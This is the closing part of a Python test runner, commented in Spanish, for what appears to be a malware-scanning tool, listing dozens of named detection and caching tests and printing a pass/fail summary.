        assert 'main' in recorded, "con tkinter debe importarse main"
    finally:
        importlib.import_module = saved_import
        sys.path[:] = saved_path
        v._TKINTER_AVAILABLE = saved_flag
        v.WARNED[:] = saved_warned
    print("✅ M4. sin tkinter solo se omite el import de main (con aviso); el ZIP lo incluye")



if __name__ == '__main__':
    tests = [
        test_gui_open_close_with_display,
        test_gui_visible_with_display,
        test_a3_schema_v1_in_json,
        test_fuzzy_empty_and_valid_databases_are_visible,
        test_a3_sample_sha256_semantics,
        test_a4_v5_purged_v6_served,
        test_a4_future_version_preserved_not_served,
        test_a4_old_engine_vs_new_cache,
        test_a4_ttl_purge_independent_of_version,
        test_a4_thread_connections_isolated,
        test_a5_zip_inventory_source,
        test_a5_zip_inventory_full,
        test_a5_phase_manifest_separation,
        test_a5_source_default_config,
        test_audit_trends_hardening,
        # --- ÁREAS v2 (antes huérfanas: definidas pero nunca ejecutadas) ---
        test_area1_magic_bytes_and_type_mismatch,
        test_area1b_imphash_separate_db,
        test_area2_entropy_windows_and_compression,
        test_area3_archives,
        test_area4_scoring_new_layers,
        test_area6_trust_decay_and_layer_scores,
        # --- PRIORIDADES originales ---
        test_priority1_no_execution,
        test_priority2_whitelist,
        test_priority3_cache,
        test_priority4_correlated_scoring,
        test_priority5_logging_and_large_files,
        test_priority6_no_false_positives_on_media_files,
        # --- ÁREA 7: importador fuzzy ---
        test_area7_fuzzy_importer,
        test_cooperative_cancel_and_json_log_format,
        # --- VERIFICACIÓN externa (secciones 2.1-2.3 y 3.1-3.2) ---
        test_verification_31_structured_traversal_propagation,
        test_verification_22_container_and_truncation_warnings,
        test_verification_21_web_script_detection,
        test_verification_32_cache_hit_uses_scanned_path,
        test_verification_23_trust_decay_cli_shared_helper,
        test_verification_19_similarity_not_packer,
        # --- N-17: motor único CLI/GUI ---
        test_verification_33_engine_shared_pipeline,
        test_verification_34_cli_gui_delegate_to_engine,
        # --- N-17: fixes de la revisión ---
        test_verification_35_force_rescan_expires_whitelist,
        test_verification_36_engine_version_bump,
        test_verification_37_engine_exposes_tlsh,
        test_verification_38_expired_whitelist_invalidates_cached_hit,
        # --- Ronda 2: R-01..R-05 ---
        test_r01_dropper_patterns_high_confidence,
        test_r02_nested_structured_depth_and_budget_shared,
        test_r03_ratio_is_weak_signal_but_hard_limits_stay_critical,
        test_r04_powershell_markers_word_boundaries,
        test_r05_member_time_budget_marks_incomplete,
        test_r06_ast_failure_is_reported_as_incomplete,
        test_r09_whitelist_rewrite_preserves_permissions,
        test_r10_cli_export_csv_and_fail_on,
        test_pdf_openaction_contextual_and_zip_polyglot_scoped,
        test_n13_overlay_excludes_certificate_table_and_n09_whitelist_policy,
        test_n09d_summary_level_follows_risk_score,
        test_debt_macho_magic_type_aware_entropy_fuzzy_order_and_yara_dest,
        # --- Auditoría: M1-M5 / B1-B7 / K1-K9 ---
        test_r05_engine_passes_archive_limits_to_nested,
        test_e01_on_close_cancels_and_forces_after_grace,
        test_b01_sys_exit_legit_cli_no_puntua,
        test_b02_jwt_not_flagged,
        test_b04_pdf_with_embedded_pe,
        test_c03_symlink_log_dir_rejected,
        test_c04_no_del_leak,
        test_e02_clear_expired_purges_old_engine_version,
        test_k04_risk_levels_single_source,
        test_f02_sample_sha256_renamed,
        test_f03_single_url_in_pe_low_confidence,
        test_f04_total_size_preserved_on_bomb,
        test_k08_coverage_gap_warnings,
        test_eicar_test_rules_remain_visible_without_overstating_risk,
        test_k09_scan_directory_retries_transient_oserror,
        test_r11_fuzzy_scan_limited_on_large_file,
        test_b03_pe_zip_in_overlay_middle,
        test_a03_extract_strings_early_stop,
        test_c01_ordered_refs_mutation_same_length,
        test_m04_verifier_skips_main_import_without_tkinter,
    ]

    failed, skipped, passed = [], [], []
    for test in tests:
        try:
            test()
            passed.append(test.__name__)
        except SkipTest as exc:
            skipped.append(test.__name__)
            print(f"⏭️  Omitida ({exc}): {test.__name__}")
        except AssertionError as e:
            failed.append((test.__name__, str(e)))
            print(f"\n❌ FALLÓ: {test.__name__}\n   {e}")
        except Exception as e:
            failed.append((test.__name__, str(e)))
            print(f"\n💥 ERROR INESPERADO en {test.__name__}: {e}")

    section("RESUMEN")
    if failed:
        print(f"❌ {len(failed)} fallaron | ✅ {len(passed)} pasaron | ⏭️ {len(skipped)} omitidas")
        for name, err in failed:
            print(f"   - {name}: {err}")
        sys.exit(1)
    else:
        print(f"✅ {len(passed)} pasaron | ⏭️ {len(skipped)} omitidas | ❌ 0 fallaron")
        sys.exit(0)
